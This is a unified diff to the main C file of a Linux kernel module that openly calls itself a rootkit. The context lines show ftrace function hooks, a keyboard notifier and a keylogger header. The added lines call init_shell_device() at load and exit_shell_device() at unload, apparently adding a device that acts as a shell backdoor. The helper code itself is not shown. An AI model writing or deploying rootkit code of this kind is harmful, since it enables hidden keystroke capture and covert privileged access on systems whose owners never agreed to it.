@@ -1,12 +1,15 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/module.h>
 #include <linux/notifier.h>
+#include <linux/cdev.h>
+#include <linux/sched.h>
 
 
 #include "rootkit.h"
 #include "debug.h"
 #include "keylogger.h"
 #include "hooks.h"
+#include "drivers.h"
 
 
 static struct ftrace_hook hooks[] = {
@@ -46,7 +49,10 @@ static int __init startup(void)
         return -3;
     }
 
-    
+    if (!init_shell_device()) {
+        return -4;
+    }
+
     DEBUG_PUTS("rootkit: start\n")
 
     return 0;
@@ -60,6 +66,8 @@ static void __exit cleanup(void)
     unregister_keyboard_notifier(&nb);
 
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+
+    exit_shell_device();
 
     DEBUG_PUTS("rootkit: finished\n")
 }
